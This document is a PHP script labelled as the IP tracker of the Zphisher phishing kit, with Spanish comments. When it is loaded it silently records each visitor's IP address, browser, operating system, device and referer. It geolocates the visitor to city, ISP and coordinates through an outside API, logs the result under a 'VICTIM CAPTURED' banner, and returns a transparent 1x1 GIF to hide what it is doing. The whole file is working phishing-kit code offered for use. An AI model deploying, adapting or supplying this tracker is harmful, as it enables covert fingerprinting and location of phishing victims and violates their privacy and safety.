<?php
/**
 * ZPHISHER 2025 - IP TRACKER
 * Versión con path absoluto
 */

// Path absoluto para garantizar que funcione
$log_file = __DIR__ . '/ip.txt';
$debug_file = __DIR__ . '/debug.txt';

// DEBUG
$debug_log = "=== DEBUG ===\n";
$debug_log .= "Script path: " . __FILE__ . "\n";
$debug_log .= "Log file: $log_file\n";
$debug_log .= "HTTP_CLIENT_IP: " . ($_SERVER['HTTP_CLIENT_IP'] ?? 'not set') . "\n";
$debug_log .= "HTTP_X_FORWARDED_FOR: " . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'not set') . "\n";
$debug_log .= "REMOTE_ADDR: " . ($_SERVER['REMOTE_ADDR'] ?? 'not set') . "\n";

// Intentar escribir debug
$write_result = @file_put_contents($debug_file, $debug_log . "\n", FILE_APPEND);
$debug_log .= "Write result: " . ($write_result !== false ? "SUCCESS ($write_result bytes)" : "FAILED") . "\n";

// Captura de IP
if(isset($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddr = $_SERVER['HTTP_CLIENT_IP'];
} elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddr = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddr = $_SERVER['REMOTE_ADDR'];
}

if(strpos($ipaddr,',') !== false) {
    $ipaddr = preg_split("/\,/", $ipaddr)[0];
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

// Funciones
function getDeviceType($ua) {
    if(preg_match('/(android|webos|iphone|ipad|ipod|blackberry)/i', $ua)) return "Mobile";
    if(preg_match('/(tablet|ipad)/i', $ua)) return "Tablet";
    return "Desktop";
}

function getBrowser($ua) {
    if(preg_match('/Firefox/i', $ua)) return "Firefox";
    if(preg_match('/Chrome/i', $ua)) return "Chrome";
    if(preg_match('/Safari/i', $ua)) return "Safari";
    if(preg_match('/Edge/i', $ua)) return "Edge";
    return "Unknown";
}

function getOS($ua) {
    if(preg_match('/windows nt 10/i', $ua)) return "Windows 10/11";
    if(preg_match('/windows nt 6.3/i', $ua)) return "Windows 8.1";
    if(preg_match('/windows nt 6.2/i', $ua)) return "Windows 8";
    if(preg_match('/windows nt 6.1/i', $ua)) return "Windows 7";
    if(preg_match('/windows/i', $ua)) return "Windows";
    if(preg_match('/mac os x 1[0-9]_[0-9]+/i', $ua)) {
        preg_match('/mac os x (1[0-9]_[0-9]+)/i', $ua, $matches);
        return "MacOS " . str_replace('_', '.', $matches[1]);
    }
    if(preg_match('/mac os x/i', $ua)) return "MacOS";
    if(preg_match('/android ([0-9.]+)/i', $ua, $matches)) return "Android " . $matches[1];
    if(preg_match('/android/i', $ua)) return "Android";
    if(preg_match('/iphone os ([0-9_]+)/i', $ua, $matches)) return "iOS " . str_replace('_', '.', $matches[1]);
    if(preg_match('/ipad; cpu os ([0-9_]+)/i', $ua, $matches)) return "iPadOS " . str_replace('_', '.', $matches[1]);
    if(preg_match('/iphone|ipad/i', $ua)) return "iOS";
    return "Linux";
}

$device = getDeviceType($user_agent);
$browser = getBrowser($user_agent);
$os = getOS($user_agent);

// Geolocalización
$geo_data = @file_get_contents("http://ip-api.com/json/{$ipaddr}?fields=country,countryCode,region,regionName,city,zip,isp,org,lat,lon,timezone");
$geo = json_decode($geo_data, true);

file_put_contents($debug_file, "Geo API response: " . ($geo_data ?: 'empty') . "\n", FILE_APPEND);

// Log formateado
$log = "\n╔═══════════════════════════════════════════════════╗\n";
$log .= "║  🎯 VICTIM CAPTURED - " . $timestamp . "  ║\n";
$log .= "╚═══════════════════════════════════════════════════╝\n";
$log .= "IP: " . $ipaddr . "\n";
$log .= "🌐 IP Address : " . $ipaddr . "\n";

if($geo && isset($geo['country'])) {
    $log .= "🌍 Location   : " . $geo['city'] . ", " . $geo['regionName'] . ", " . $geo['country'] . " (" . $geo['countryCode'] . ")\n";
    $log .= "🏢 ISP        : " . $geo['isp'] . "\n";
    if(isset($geo['org']) && $geo['org'] != $geo['isp']) {
        $log .= "🏛️  Organization: " . $geo['org'] . "\n";
    }
    $log .= "📍 Coordinates: " . $geo['lat'] . ", " . $geo['lon'] . "\n";
    $log .= "🕐 Timezone   : " . $geo['timezone'] . "\n";
} else {
    $log .= "⚠️  Geolocation: Not available (localhost or private IP)\n";
}

$log .= "💻 Device     : " . $device . "\n";
$log .= "🖥️  OS         : " . $os . "\n";
$log .= "🌐 Browser    : " . $browser . "\n";
$log .= "🔗 Referer    : " . $referer . "\n";
$log .= "📱 User-Agent : " . $user_agent . "\n";
$log .= str_repeat("─", 52) . "\n";

// Guardar con manejo de errores
$write_success = @file_put_contents($log_file, $log, FILE_APPEND);

if($write_success === false) {
    file_put_contents($debug_file, "ERROR: Cannot write to $log_file\n", FILE_APPEND);
    file_put_contents($debug_file, "Permissions: " . decoct(fileperms(__DIR__) & 0777) . "\n", FILE_APPEND);
} else {
    file_put_contents($debug_file, "SUCCESS: Wrote $write_success bytes to $log_file\n", FILE_APPEND);
}

// Devolver imagen invisible
header('Content-Type: image/gif');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

// GIF transparente 1x1 pixel
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
exit;
?>
